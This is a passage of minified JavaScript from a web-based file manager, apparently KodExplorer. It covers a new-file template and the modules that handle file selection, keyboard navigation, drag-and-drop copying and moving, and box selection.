}), define("app/path/tpl/file/create.html", [], "<div class=\"file select {{if type=='file'}}menu-file{{else}}menu-folder{{/if}} file-icon-edit\" id=\"makefile\">\n	{{if listType=='list'}}<span class=\"children-more\"></span>{{/if}}\n	<div class=\"filename\" style=\"padding-top: 0px;\">\n		<span class=\"title\">\n			{{if type=='folder'}}\n				<div class='ico' filetype='folder'>{{\"folder\" | kod.core.icon}}</div>\n			{{else}}\n				<div class='ico' filetype='{{ext}}'>{{ext | kod.core.icon}}</div>\n			{{/if}}\n			<div class=\"textarea\">\n				{{if listType=='icon'}}\n				<textarea class='newfile fix'>{{newname}}</textarea>\n				{{else}}\n				<input class='newfile fix' value='{{newname}}'/>\n				{{/if}}\n			</div>\n		</span>\n	</div>\n	<div style=\"clear:both;\"></div>\n</div>\n"), define("app/src/explorer/fileLight", [], function() {
    var e = $(),
        t = $(),
        a = function() {
            var e;
            e = "split" != G.userConfig.listType ? $(".bodymain .file-continer .file") : $(".bodymain .file-continer .split-select .file"), t = e, u("clear"), Hook.trigger("explorer.fileSelect.init", this)
        },
        i = function() {
            var t = $(Config.SelectClass);
            e = t, t.length > 1 && c(t), u("menu-file"), Hook.trigger("explorer.fileSelect.change", this)
        },
        n = function() {
            if (G.jsonData && G.jsonData.fileList) {
                var e = G.jsonData.fileList.length + G.jsonData.folderList.length;
                $(".file-select-info .item-num").html(e + LNG.folder_info_item)
            }
        },
        o = function() {
            var t = "",
                a = 0,
                i = e;
            0 != i.length && (t = i.length + LNG.folder_info_item_select, i.each(function() {
                a += parseInt($(this).attr("data-size"))
            }), 0 != a && (t = t + " (" + pathTools.fileSize(a) + ")")), $(".file-select-info .item-select").html(t)
        },
        s = function(t) {
            var a = e;
            if (void 0 == t && a && a.length >= 1 && (t = $(a[a.length - 1])), void 0 != t && !t.inScreen()) {
                var i = $(".bodymain");
                "split" == G.userConfig.listType && (i = t.parent());
                var n = t.offset().top - i.offset().top - i.height() / 2 + i.scrollTop();
                i.stop(!0).animate({
                    scrollTop: n
                }, 100)
            }
        },
        r = function(e) {
            return core.pathThis(h(e))
        },
        l = function(e) {
            return e.find(".ico").attr("filetype")
        },
        c = function(e) {
            if (G.jsonData.info) switch (G.jsonData.info.pathType) {
                case G.KOD_USER_RECYCLE:
                    return;
                case G.KOD_USER_FAV:
                    return e.removeClass("menu-fav-path").addClass("menu-fav-path-more"), void 0;
                case G.KOD_USER_SHARE:
                    if (-1 == trim(G.thisPath, "/").search("/")) return e.removeClass("menu-share-path").addClass("menu-share-path-more"), void 0;
                case G.KOD_GROUP_ROOT_SELF:
                case G.KOD_GROUP_ROOT_ALL:
                    return e.removeClass("menu-group-root").addClass("menu-group-root-more"), void 0;
                default:
            }
            e.removeClass("menu-file menu-folder").addClass("menu-more"), u()
        },
        d = function(e) {
            var t = {
                "file-box": "menu-file",
                "folder-box": "menu-folder",
                "menu-recycle-path": "menu-recycle-path",
                "menu-share-path-more": "menu-share-path",
                "menu-fav-path-more": "menu-fav-path",
                "menu-group-root-more": "menu-group-root",
                "menu-default": "menu-default"
            };
            e.removeClass("menu-more");
            for (var a in t) e.hasClass(a) && e.addClass(t[a]);
            u()
        },
        p = function() {
            var t = [];
            if (0 != e.length) return e.each(function() {
                t.push(h($(this)))
            }), t
        },
        f = function() {
            if (0 != e.length) {
                var t = e;
                t.removeClass(Config.SelectClassName), t.each(function() {
                    d($(this))
                }), e = $(), u(), Hook.trigger("explorer.fileSelect.change", this)
            }
        },
        u = function() {
            0 == e.length ? ($(".drop-menu-action li").addClass("disabled"), $(".drop-menu-action #past").removeClass("disabled"), $(".drop-menu-action #info").removeClass("disabled")) : $(".drop-menu-action li").removeClass("disabled")
        },
        h = function(e, t) {
            return void 0 == t && (t = "data-path"), void 0 != e.attr("data-path-children") && (t = "data-path-children"), pathHashDecode(e.attr(t))
        };
    return {
        init: a,
        name: r,
        path: h,
        type: l,
        fileListSelect: function(t) {
            return t && (e = t), e
        },
        fileListAll: function(e) {
            return e && (t = e), t
        },
        select: i,
        setInView: s,
        listNumberSet: n,
        selectNumSet: o,
        setMenu: c,
        resumeMenu: d,
        getAllName: p,
        clear: f,
        menuAction: u
    }
}), define("app/src/explorer/fileSelect", [], function() {
    var e, t = !1,
        a = !1,
        i = !1,
        n = function() {
            $(Config.FileBoxClass).die("touchstart").live("touchstart", function(e) {
                var t = $(e.target);
                t.hasClass("item-menu") || t.parent().hasClass("item-menu") || t.hasClass("item-select") || t.parent().hasClass("item-select") || t.parents(".children-more").exists() || ($(this).hasClass("select") ? ui.path.open() : (ui.fileLight.clear(), $(this).removeClass("select"), $(this).addClass("select"), ui.fileLight.select()))
            }), $(Config.FileBoxClass).die("mouseenter").live("mouseenter", function() {
                a && r(!0, $(this)), t || a || $(this).addClass(Config.HoverClassName), $(this).unbind("mousedown").bind("mousedown", function(e) {
                    if ($(e.target).is("input") || $(e.target).is("textarea")) return !0;
                    if ($(this).focus(), $.contextMenu.hidden(), $(e.target).parents(".children-more").exists()) return ui.fileContent.pathChildrenTree($(this)), stopPP(e), !1;
                    if ($(e.target).hasClass("item-menu") || $(e.target).parent().hasClass("item-menu")) return $(this).hasClass(Config.SelectClassName) ? void 0 : (ui.fileLight.clear(), $(this).addClass(Config.SelectClassName), ui.fileLight.select(), !0);
                    if (!$(e.target).hasClass("item-select") && !$(e.target).parent().hasClass("item-select")) {
                        if (!(e.ctrlKey || e.metaKey || e.shiftKey || $(this).hasClass(Config.SelectClassName))) return ui.fileLight.clear(), $(this).addClass(Config.SelectClassName), ui.fileLight.select(), !0;
                        if (3 != e.which || $(this).hasClass(Config.SelectClassName) || (ui.fileLight.clear(), $(this).addClass(Config.SelectClassName), ui.fileLight.select()), (e.ctrlKey || e.metaKey) && ($(this).hasClass(Config.SelectClassName) ? i = !0 : (ui.fileLight.setMenu($(this)), $(this).addClass(Config.SelectClassName)), ui.fileLight.select()), e.shiftKey) {
                            var t = k.fileListAll($(this)),
                                a = k.fileListSelect($(this)),
                                n = t.index($(this));
                            if (0 == a.length) T(0, n, t);
                            else {
                                var o = t.index(a.first()),
                                    s = t.index(a.last());
                                o > n ? T(n, s, t) : n > s ? T(o, n, t) : T(o, n, t)
                            }
                        }
                        return !0
                    }
                }).unbind("mouseup").bind("mouseup", function() {
                    return $(".file-select-drag-temp").removeClass("file-select-drag-temp"), !0
                })
            }).die("mouseleave").live("mouseleave", function() {
                $(this).removeClass(Config.HoverClassName), a && r(!1, $(this))
            }).die("click").live("click", function(e) {
                if (stopPP(e), a) return !1;
                if ($(e.target).hasClass("item-menu") || $(e.target).parent().hasClass("item-menu")) {
                    var t = $(this).find(".item-menu");
                    return $(this).contextMenu({
                        x: t.offset().left + t.width(),
                        y: t.offset().top
                    }), !0
                }
                return $(e.target).hasClass("item-select") || $(e.target).parent().hasClass("item-select") ? ($(this).toggleClass(Config.SelectClassName), ui.fileLight.select(), !0) : 0 != $(this).find(".textarea").length ? !0 : 0 != $(".file-draging-box").length ? !0 : (e.ctrlKey || e.metaKey || e.shiftKey ? (e.ctrlKey || e.metaKey) && i && (i = !1, ui.fileLight.resumeMenu($(this)), $(this).removeClass(Config.SelectClassName), ui.fileLight.select()) : (ui.fileLight.clear(), $(this).addClass(Config.SelectClassName), ui.fileLight.select(), f($(this))), void 0)
            }), $(Config.FileBoxClass).myDbclick(function(e) {
                var t = $(e.target);
                if (t.is("textarea") || t.is("input") || t.hasClass("children-more") || t.hasClass("children-more-cert") || t.hasClass("item-menu") || t.parent().hasClass("item-menu") || t.hasClass("item-select") || t.parent().hasClass("item-select")) return !0;
                if (t.hasClass("db-click-rename")) {
                    var a = t.parents(".file");
                    return a.hasClass("systemBox"), ui.path.rname(), !0
                }
                if (e.altKey) ui.path.info();
                else {
                    if (1 != ui.fileLight.fileListSelect().length) return !0;
                    if ("split" == G.userConfig.listType && p($(this))) {
                        var i = ui.fileLight.path($(this));
                        return G.thisPath = "", $(".file-list-split .split-box").remove(), ui.path.list(i), !0
                    }
                    ui.path.open()
                }
            }), l(), c(), d()
        },
        o = 1e3,
        s = function(e) {
            $(".file-select-drag-temp").flash(2, 100), setTimeout(function() {
                if ("list" == G.userConfig.listType) {
                    if ($(".file-select-drag-temp .children-more-cert").hasClass("cert-open")) return;
                    ui.fileContent.pathChildrenTree(e)
                } else if ("split" == G.userConfig.listType) f(e);
                else if ("icon" == G.userConfig.listType) {
                    var t = ui.fileLight.path(e);
                    ui.path.list(t)
                }
            }, 300)
        },
        r = function(t, a) {
            var i = "file-select-drag-temp";
            t ? !a.hasClass(Config.TypeFolderClass) && !a.hasClass("menu-recycle-button") || a.hasClass(Config.SelectClassName) || ($("." + i).removeClass(i), a.addClass(i), $(".children-list-dropover").removeClass("children-list-dropover"), $(".file-select-over-temp").removeClass("file-select-over-temp"), e = setTimeout(function() {
                s(a)
            }, o)) : (a.removeClass(i), clearTimeout(e), e = !1)
        },
        l = function() {
            var e;
            $("#folder-list-tree a").die("mouseenter").live("mouseenter", function() {
                if (a) {
                    ($(this).hasClass("menu-tree-folder") || $(this).hasClass("menu-tree-folder-fav")) && $(this).addClass("curDropTreeNode"), clearTimeout(e), e = !1;
                    var t = ui.tree.zTree(),
                        i = t.getNodeByTId($(this).parent().attr("id"));
                    !i.open && i.isParent && (e = setTimeout(function() {
                        t.expandNode(i, !0)
                    }, o))
                }
            }).die("mouseup").live("mouseup", function() {
                if (a) {
                    $(this).removeClass("curDropTreeNode"), clearTimeout(e), e = !1;
                    var t = ui.tree.zTree(),
                        i = t.getNodeByTId($(this).parent().attr("id"));
                    setTimeout(function() {
                        i.isParent = !0, t.reAsyncChildNodes(i, "refresh")
                    }, 100)
                }
            }).die("mouseleave").live("mouseleave", function() {
                a && ($(this).removeClass("curDropTreeNode"), clearTimeout(e), e = !1)
            })
        },
        c = function() {
            var e;
            $(".header-middle .yarnlet a").die("mouseenter").live("mouseenter", function() {
                a && ($(this).addClass("curDropToPath"), e = setTimeout(function() {
                    var e = $(".curDropToPath");
                    e.flash(2, 100), setTimeout(function() {
                        ui.path.list(e.attr("data-path"))
                    }, 300)
                }, o))
            }).die("mouseup mouseleave").live("mouseup mouseleave", function() {
                a && ($(this).removeClass("curDropToPath"), clearTimeout(e), e = !1)
            })
        },
        d = function() {
            var e = function(e, t) {
                if (a && "list" == G.userConfig.listType) {
                    $(".file-select-over-temp").removeClass("file-select-over-temp");
                    var i = "children-list-dropover";
                    if (t) {
                        if ($(".file-select-drag-temp").exists()) return $("." + i).removeClass(i), void 0;
                        $("." + i).not(e).removeClass(i), e.addClass(i), e.prev().hasClass("file") && e.prev().addClass("file-select-over-temp")
                    } else e.removeClass(i)
                }
            };
            $(".menu-body-main").bind("mouseover", function(t) {
                e($(this), !0, t)
            }).bind("mouseup mouseleave", function(t) {
                e($(this), !1, t)
            }), $(".children-list").die("mouseover").live("mouseover", function(t) {
                e($(this), !0, t), stopPP(t)
            }).die("mouseup mouseleave").live("mouseup mouseleave", function(t) {
                e($(this), !1, t)
            })
        },
        p = function(e) {
            return "icon" == G.userConfig.listType ? e.hasClass("folder-box") || e.hasClass("menu-recycle-button") ? !0 : !1 : "list" == G.userConfig.listType ? e.hasClass("folder-box") || e.hasClass("menu-recycle-button") || 0 != e.find(".children-more-cert").length ? !0 : !1 : "split" == G.userConfig.listType ? e.hasClass("folder-box") || e.hasClass("menu-recycle-button") || 0 != e.find(".children-more-cert").length ? !0 : !1 : void 0
        },
        f = function(e) {
            if ("split" == G.userConfig.listType && p(e)) {
                var t = ui.fileLight.path(e);
                ui.path.history.add(t), ui.fileContent.pathChildrenSplit(t, function() {
                    h(t)
                })
            }
        },
        u = function() {
            var e = ".file-list-split .split-box",
                t = "split-hover";
            $(e).live("mouseenter", function() {
                $(e).removeClass(t), $(this).addClass(t)
            }).die("mouseleave").live("mouseleave", function() {
                $(this).removeClass(t)
            }).die("click").live("click", function() {
                h(ui.fileLight.path($(this)))
            }).die("mousedown").live("mousedown", function(e) {
                var t = $(e.target).parents(".file");
                (0 == t.length || 0 == t.find(".children-open").length) && h(ui.fileLight.path($(this)))
            })
        },
        h = function(e) {
            var t = $(".file-list-split .split-box"),
                a = $('.file-list-split .split-box[data-path="' + pathHashEncode(e) + '"]'),
                i = $('.file-list-split .split-box .file[data-path="' + pathHashEncode(e) + '"]'),
                n = "split-select";
            0 == a.length && (a = t.last()), t.removeClass(n), a.addClass(n), 0 == ui.fileLight.fileListSelect().length && i.addClass("select"), ui.fileLight.select();
            var o = a.data("jsonData");
            o && e && (ui.fileContent.pathTypeChange(o), G.thisPath = e, G.jsonData = o, ui.headerAddress.addressSet()), ui.fileLight.init()
        },
        m = function(e) {
            return e.hasClass("menuSharePath") || e.hasClass("systemBox") ? !1 : !0
        },
        v = function(e) {
            $("body").removeClass("cursor-mouse cursor-warning cursor-move cursor-down cursor-add"), e && $("body").addClass("cursor-mouse cursor-" + e)
        },
        g = function() {
            var i, n, o, s = 150,
                r = !1,
                l = !1,
                c = 0,
                d = !1,
                p = -15,
                f = 10,
                u = 0,
                h = 0,
                g = "selectDragDraging";
            $(Config.FileBoxClass).die("mousedown").live("mousedown", function(e) {
                if (!e.shiftKey) {
                    if (ui.isEdit()) return !0;
                    if (1 != e.which || t) return !0;
                    i = $(this), m(i) && (k(e), $.browser.mozilla || this.setCapture && this.setCapture(), $(document).mousemove(function(e) {
                        x(e)
                    }), $(document).keydown(function(e) {
                        x(e)
                    }), $(document).keyup(function(e) {
                        x(e)
                    }), $(document).one("mouseup", function(e) {
                        L(e), this.releaseCapture && this.releaseCapture()
                    }), $(document).one("keyup", function(e) {
                        27 == e.which && L(!1)
                    }))
                }
            });
            var b, y, k = function(e) {
                    $.contextMenu.hidden(), a = !0, c = $.now(), u = e.pageY, h = e.pageX, n = $(document).height(), o = $(document).width(), l = $(e.target).parents(".file")
                },
                x = function(e) {
                    if (!a) return !0;
                    if (window.getSelection ? window.getSelection().removeAllRanges() : document.selection.empty(), $.now() - c > s && !d && (C(), r = $(".draggable-dragging"), r.attr("data-beforeInfo", r.find("span").html())), d) {
                        var t = e.clientX >= o - 50 ? o - 50 : e.clientX,
                            i = e.clientY >= n - 50 ? n - 50 : e.clientY;
                        return t = 0 >= t ? 0 : t, i = 0 >= i ? 0 : i, t -= p, i -= f, r.css({
                            left: t,
                            top: i
                        }), w(e), P(t - h + p, i - u + f), !0
                    }
                },
                w = function(e) {
                    clearTimeout(b), b = !1, b = setTimeout(function() {
                        try {
                            N(e)
                        } catch (t) {}
                    }, 10)
                },
                N = function(e) {
                    var t = e.ctrlKey || e.metaKey,
                        a = function(e, t) {
                            G.sid !== void 0 && (e = "none"), void 0 != t && 0 !== t.search(G.KOD_GROUP_PATH) && 0 !== t.search(G.KOD_USER_RECYCLE) && core.isSystemPath(t) && (e = "clear");
                            var a = htmlEncode(core.pathThis(t)),
                                i = " " + r.attr("data-beforeInfo").replace(/<[^<>]+>/g, ""),
                                n = {
                                    copyTo: '<i class="font-icon bg-ok icon-copy"></i><b>' + LNG.copy_to + '</b>"' + a + '"',
                                    moveTo: '<i class="font-icon bg-ok icon-share-alt"></i><b>' + LNG.cute_to + '</b>"' + a + '"',
                                    remove: '<i class="font-icon bg-error icon-trash"></i><b>' + LNG.remove + i + "</b>",
                                    share: '<i class="font-icon bg-ok icon-share-sign"></i><b>' + LNG.share + i + "</b>",
                                    none: '<i class="font-icon bg-error icon-minus"></i><b>' + LNG.no_permission_write + "</b>",
                                    clear: r.attr("data-beforeInfo")
                                };
                            S(t) || (n.copyTo = '<i class="font-icon bg-ok icon-copy"></i><b>' + LNG.clone + "</b>"), r.find("span").html(n[e]), r.attr("data-actionType", e), r.attr("data-actionPath", t), r.attr("id", "drag-action-" + e);
                            var n = {
                                copyTo: "add",
                                moveTo: "move",
                                remove: "move",
                                share: "add",
                                none: "default",
                                clear: "default"
                            };
                            v(n[e])
                        },
                        i = G.thisPath,
                        n = "";
                    if ($(".curDropToPath").exists()) i = $(".curDropToPath").attr("data-path");
                    else if ($(".curDropTreeNode").exists()) {
                        var o = $(".curDropTreeNode").parent().attr("id"),
                            s = ui.tree.zTree().getNodeByTId(o);
                        i = s.path
                    } else if ($(".file-select-drag-temp").exists()) i = ui.fileLight.path($(".file-select-drag-temp")), $(".file-select-drag-temp").hasClass("menu-recycle-button") && (n = "remove");
                    else if ($(".children-list-dropover").exists()) {
                        var l = $(".children-list-dropover");
                        i = l.hasClass("children-list") ? pathHashDecode(l.attr("data-path-children")) : G.thisPath
                    } else $(".split-hover").exists() ? i = ui.fileLight.path($(".split-hover")) : n = $(".recycle-hover").exists() ? "remove" : $(".share-hover").exists() && 1 == ui.fileLight.fileListSelect().length ? "share" : "clear";
                    n && !t || (n = t ? "copyTo" : S(i) ? "moveTo" : "clear"), a(n, i)
                },
                L = function(t) {
                    if (!a) return !1;
                    if (clearTimeout(b), clearTimeout(e), a = !1, d = !1, $("body").removeClass(g), r) {
                        r.addClass("animated-300").addClass("flipOutXLine").fadeOut(200, function() {
                            r.remove(), r = !1
                        }), $(".curDropToPath,.curDropTreeNode,.curDropTreeNode,.file-select-drag-temp,.children-list-dropover").removeClass("curDropToPath curDropTreeNode curDropTreeNode file-select-drag-temp children-list-dropover");
                        var i = r.attr("data-actionType");
                        if (-1 != $.inArray(i, ["copyTo", "moveTo", "remove", "share"]) ? O(!1) : O(!0), v(!1), t) {
                            var n = function(e, t) {
                                    switch (ShareData.data("FILE_SELECT_ARRAY", _), e) {
                                        case "copyTo":
                                            ui.path.copyDrag(t, !0);
                                            break;
                                        case "moveTo":
                                            ui.path.cuteDrag(t);
                                            break;
                                        case "remove":
                                            ui.path.remove(!0);
                                            break;
                                        case "share":
                                            ui.path.share();
                                            break;
                                        default:
                                    }
                                },
                                o = r.attr("data-actionPath");
                            n(i, o)
                        }
                    }
                },
                C = function() {
                    $("body").addClass(g);
                    var e = ui.fileLight.fileListSelect().length;
                    $('<div class="file draggable-dragging"><div class="drag-number">' + e + '</div><span><i class="font-icon bg-default icon-ok"></i>' + e + " " + LNG.file + "</span></div>").appendTo("body"), d = !0, setTimeout(I, 20), T()
                },
                _ = [],
                T = function() {
                    _ = [], ui.fileLight.fileListSelect().each(function() {
                        _.push({
                            path: ui.fileLight.path($(this)),
                            type: "folder" == ui.fileLight.type($(this)) ? "folder" : "file"
                        })
                    })
                },
                S = function(e) {
                    for (var t = 0; _.length > t; t++)
                        if (core.pathFather(_[t].path) != e) return !0;
                    return !1
                },
                A = 0,
                E = 5,
                D = 35,
                j = 20,
                z = 50,
                I = function() {
                    clearTimeout($(".file-draging-box").data("removeDelay")), $(".file-draging .file").stop(), $(".file-draging-box").remove();
                    var e = {
                            icon: "file-list-icon",
                            list: "file-list-list",
                            split: "file-list-split"
                        },
                        t = e[G.userConfig.listType];
                    $("<div class='file-continer file-draging-box " + t + "'><div class='" + t + " file-draging'></div></div>").appendTo("body"), y = $(Config.SelectClass).filter("[data-path!='']");
                    var a = y.clone();
                    (y.length >= z || $.browser.msie) && (a = l.clone()), a.appendTo(".file-draging"), a.each(function(e) {
                        var t = $(".bodymain .file-continer .file[data-path='" + $(this).attr("data-path") + "']"),
                            i = t.offset();
                        $(this).css({
                            left: i.left,
                            top: i.top,
                            width: t.width()
                        }), $(this).data({
                            "data-left": i.left,
                            "data-top": i.top,
                            "data-animateTime": 200 + e * E,
                            "data-sizeAdd": A * e
                        }), $(this).attr("data-path") == l.attr("data-path") && $(this).addClass("handle_target"), 1 == a.length && ($(this).data({
                            "data-animateTime": 0
                        }), j = 0)
                    }), y.addClass("item-file-draging");
                    var i = setTimeout(function() {
                        $(".file-draging-box").data("animate", "finished");
                        var e = $(".draggable-dragging");
                        a.each(function() {
                            var t = $(this),
                                a = $(this).data("data-sizeAdd"),
                                i = $(this).data("data-animateTime");
                            $(this).data("status", "ready"), $(this).animate({
                                opacity: 1
                            }, {
                                duration: i,
                                easing: "swing",
                                progress: function(i, n) {
                                    var o = t.offset(),
                                        s = e.offset(),
                                        r = (s.left + a - o.left) * n,
                                        l = (s.top + a + D - o.top) * n;
                                    t.css({
                                        left: o.left + r,
                                        top: o.top + l
                                    })
                                },
                                complete: function() {
                                    t.data("status", "finished")
                                }
                            })
                        })
                    }, j);
                    $(".file-draging-box").data("dragDelay", i), $(".file-draging-box").data("animate", "ready")
                },
                P = function(e, t) {
                    return "finished" != $(".file-draging-box").data("animate") ? ($(".file-draging .file").each(function() {
                        $(this).css({
                            left: $(this).data("data-left") + e,
                            top: $(this).data("data-top") + t
                        })
                    }), void 0) : ($(".file-draging .file").each(function() {
                        if ("finished" == $(this).data("status")) {
                            var e = $(this).data("data-sizeAdd"),
                                t = $(".draggable-dragging").offset();
                            $(this).css({
                                left: t.left + e,
                                top: t.top + e + D
                            })
                        }
                    }), void 0)
                },
                O = function(e) {
                    var t = $(".file-draging .file").length;
                    clearTimeout($(".file-draging-box").data("dragDelay")), $(".file-draging .file").each(function(t) {
                        var a = t * E,
                            i = $(".bodymain .file-continer .file[data-path='" + $(this).attr("data-path") + "']");
                        e ? $(this).stop().animate({
                            left: $(this).data("data-left"),
                            top: $(this).data("data-top")
                        }, 250 + a, function() {
                            y.removeClass("item-file-draging")
                        }).animate({
                            opacity: 0
                        }, 150, function() {
                            $(this).remove()
                        }) : (i.stop().animate({
                            opacity: 1
                        }, 100), $(this).stop().animate({
                            opacity: 0
                        }, 200 + a, function() {
                            $(this).remove()
                        }))
                    });
                    var a = setTimeout(function() {
                        $(".file-draging-box").remove()
                    }, 400 + E * t);
                    $(".file-draging-box").data("removeDelay", a)
                }
        },
        b = function() {
            var e = null,
                i = null,
                n = null,
                o = 0,
                s = 0,
                r = 0,
                l = 0,
                c = "",
                d = "bodymain";
            core.isApp("desktop") && (d = "file-continer");
            var p = $("." + d);
            p.die("mousedown").live("mousedown", function(e) {
                if (!($(e.target).hasClass(d) && 20 > $(document).width() - e.pageX)) {
                    if (r = $(".file-continer").outerHeight(), l = p.outerHeight(), ui.isEdit()) return !0;
                    if (1 != e.which || a) return !0;
                    f(e), this.setCapture && this.setCapture(), $(document).unbind("mousemove").mousemove(function(e) {
                        u(e)
                    }), $(document).one("mouseup", function(e) {
                        clearTimeout(c), c = !1, v(e), this.releaseCapture && this.releaseCapture()
                    })
                }
            });
            var f = function(a) {
                    s = p.offset().left - p.scrollLeft(), o = p.offset().top - p.scrollTop(), "split" == G.userConfig.listType && (o += $(a.target).parents(".split-box").scrollTop()), $(a.target).parent().hasClass(Config.FileBoxClassName) || $(a.target).parent().parent().hasClass(Config.FileBoxClassName) || $(a.target).hasClass("fix") || ($.contextMenu.hidden(), a.ctrlKey || a.metaKey || a.shiftKey || ui.fileLight.clear(), $(a.target).hasClass("ico") || (e = a.pageX - s, i = a.pageY - o, c = setTimeout(function() {
                        t = !0, 0 == $(".select-container").length && $('<div class="select-container"></div>').appendTo(Config.FileBoxSelector), n = $(".select-container")
                    }, 100)))
                },
                u = function(a) {
                    if (!t) return !0;
                    var o = a.pageX - p.offset().left + p.scrollLeft(),
                        s = a.pageY - p.offset().top + p.scrollTop(),
                        c = Math.abs(o - e),
                        d = Math.abs(s - i);
                    s > i && d > r - i && r > l && (d = r - i), h(s, i, d, p), n.css({
                        left: Math.min(o, e) + 2,
                        top: Math.min(s, i) + 2,
                        width: c,
                        height: d
                    }), 1e3 > ui.fileLight.fileListAll().length && m()
                },
                h = function(e, t, a, i) {
                    var n = i.outerHeight(),
                        o = i.scrollTop(),
                        s = o;
                    if (e > t) {
                        var r = t + a,
                            l = n + o,
                            c = r - l;
                        c > 0 ? s += c : -n > c && (s += n - Math.abs(c))
                    } else if (t > e) {
                        var d = t - a,
                            p = o,
                            c = d - p;
                        0 > c ? s += c : c > n && (s += Math.abs(c) - n)
                    }
                    s !== o && i.stop(!0, !1).animate({
                        scrollTop: s
                    }, 100)
                },
                m = function() {
                    for (var e = n.offset().left - p.offset().left + p.scrollLeft(), t = n.offset().top - p.offset().top + p.scrollTop(), a = e + n.width(), i = t + n.height(), o = ui.fileLight.fileListAll(), s = 0; o.length > s; s++) {
                        var r = o[s],
                            l = $(o[s]),
                            c = l.parent().scrollTop(),
                            d = r.offsetLeft,
                            f = r.offsetTop - c,
                            u = d + l.width(),
                            h = f + l.height();
                        if ("split" == G.userConfig.listType && (d += l.parents(".split-box")[0].offsetLeft, u = d + l.width()), a - e + u - d > Math.abs(e + a - (d + u)) && i - t + h - f > Math.abs(t + i - (f + h))) {
                            if (!l.hasClass("file-select-drag-temp")) {
                                if (l.hasClass("selectToggleClass")) continue;
                                if (l.hasClass(Config.SelectClassName)) {
                                    l.removeClass(Config.SelectClassName).addClass("selectToggleClass"), ui.fileLight.resumeMenu(l);
                                    continue
                                }
                                l.addClass("file-select-drag-temp")
                            }
                        } else l.removeClass("file-select-drag-temp"), l.hasClass("selectToggleClass") && l.addClass(Config.SelectClassName).removeClass("selectToggleClass")
                    }
                },
                v = function() {
                    return t ? (m(), n.remove(), $(".file-select-drag-temp").addClass(Config.SelectClassName).removeClass("file-select-drag-temp"), $(".selectToggleClass").removeClass("selectToggleClass"), ui.fileLight.select(), t = !1, e = null, i = null, void 0) : !1
                }
        },
        y = function(e, t) {
            var a = $(".file-list-split .split-box.split-select");
            if (e) a = e.parents(".split-box");
            else if (0 != ui.fileLight.fileListSelect().length) {
                var i = ui.fileLight.fileListSelect().last();
                a = i.parents(".split-box")
            }
            return a.find(t)
        },
        k = {
            fileListAll: function(e) {
                return "split" != G.userConfig.listType ? ui.fileLight.fileListAll() : y(e, ".file")
            },
            fileListSelect: function(e) {
                return "split" != G.userConfig.listType ? ui.fileLight.fileListSelect() : y(e, ".file.select")
            }
        },
        x = function(e) {
            var t = k.fileListAll(),
                a = k.fileListSelect(),
                i = t.length - 1,
                n = 0,
                o = ui.getColfileNumberDesktop(),
                s = t.index(a.first()),
                r = t.index(a.last());
            switch (e) {
                case "pageup":
                case "up":
                    n = 0 >= s || 0 == s % o ? s : s - 1;
                    break;
                case "left":
                    n = 0 >= s - o ? 0 : s - o;
                    break;
                case "pagedown":
                case "down":
                    n = r >= i || 0 == (r + 1) % o ? r : r + 1;
                    break;
                case "right":
                    n = r + o >= i ? i : r + o;
                    break;
                default:
            }
            return t.eq(n)
        },
        w = function(e) {
            if (core.isApp("desktop")) return x(e);
            var t = k.fileListAll(),
                a = k.fileListSelect(),
                i = t.length - 1,
                n = 0,
                o = ui.getRowfileNumber(),
                s = ui.getPagefileNumber(),
                r = t.index(a.first()),
                l = t.index(a.last());
            switch (e) {
                case "up":
                    n = 0 >= r - o ? 0 : r - o, n = N(n, !1);
                    break;
                case "left":
                    n = 0 >= r ? 0 : r - 1;
                    break;
                case "down":
                    n = l + o >= i ? i : l + o, n = N(n, !0);
                    break;
                case "right":
                    n = l >= i ? l : l + 1;
                    break;
                case "pageup":
                    n = 0 >= r - s ? 0 : r - s, n = N(n, !1);
                    break;
                case "pagedown":
                    n = l + s >= i ? i : l + s, n = N(n, !0);
                    break;
                default:
            }
            return t.eq(n)
        },
        N = function(e, t) {
            for (var a = k.fileListAll(), i = a.eq(e), n = a.length; 0 != i.parents(".hidden").length;) {
                if (t ? e++ : e--, 0 >= e || e >= n) return e;
                i = a.eq(e)
            }
            return e
        },
        L = function(e) {
            var t, a = k.fileListAll(),
                i = k.fileListSelect(),
                n = "",
                o = !1;
            switch (e.indexOf("shift+") >= 0 && (o = !0, e = e.replace("shift+", "")), e) {
                case "home":
                    n = i.last(), t = a.first();
                    break;
                case "end":
                    n = i.first(), t = a.last();
                    break;
                case "left":
                    n = i.last(), t = w(e);
                    break;
                case "up":
                    n = i.last(), t = w(e);
                    break;
                case "right":
                    n = i.first(), t = w(e);
                    break;
                case "down":
                    n = i.first(), t = w(e);
                    break;
                case "pageup":
                    n = i.last(), t = w(e);
                    break;
                case "pagedown":
                    n = i.first(), t = w(e);
                    break;
                case "all":
                    t = a;
                    break;
                default:
            }
            if (!_(e)) {
                if (o && "" != n) {
                    var s = a.index(n),
                        r = a.index(t);
                    if (s > r) {
                        var l = s;
                        s = r, r = l
                    }
                    return T(s, r, a), void 0
                }
                C(t)
            }
        },
        C = function(e) {
            0 != e.length && (ui.fileLight.clear(), e.addClass(Config.SelectClassName), ui.fileLight.select(), ui.fileLight.setInView(), "split" == G.userConfig.listType && 1 == e.length && f($(ui.fileLight.fileListSelect()[0])))
        },
        _ = function(e) {
            var t = $(ui.fileLight.fileListSelect()[0]);
            if ("icon" == G.userConfig.listType) return !1;
            switch (e) {
                case "left":
                    if ("list" == G.userConfig.listType)
                        if (1 == t.find(".children-more-cert.cert-open").length) t.find(".children-more-cert").removeClass("cert-open"), t.next().addClass("hidden");
                        else {
                            var a = t.parent(".children-list").prev(".file");
                            C(a)
                        } else if ("split" == G.userConfig.listType) {
                        var a = t.parents(".split-box").prev().find(".select-split-parent");
                        C(a)
                    }
                    break;
                case "right":
                    if ("list" == G.userConfig.listType) 1 == t.find(".children-more-cert").length && (ui.fileContent.pathChildrenTree(t), t.find(".children-more-cert").addClass("cert-open"), t.next().removeClass("hidden"));
                    else if ("split" == G.userConfig.listType) {
                        var a = t.parents(".split-box").next().find(".file:eq(0)");
                        C(a)
                    }
                    break;
                default:
                    return !1
            }
            return !0
        },
        T = function(e, t, a) {
            if (core.isApp("desktop")) return S(e, t, a);
            ui.fileLight.clear();
            for (var i = e; t >= i; i++) $(a[i]).addClass(Config.SelectClassName);
            ui.fileLight.select()
        },
        S = function(e, t, a) {
            var i = ui.getColfileNumberDesktop(),
                n = Math.ceil(k.fileListAll().length / i),
                e = {
                    row: e % i,
                    col: parseInt(e / i)
                },
                t = {
                    row: t % i,
                    col: parseInt(t / i)
                };
            if (t.row < e.row) {
                var o = t;
                t = e, e = o
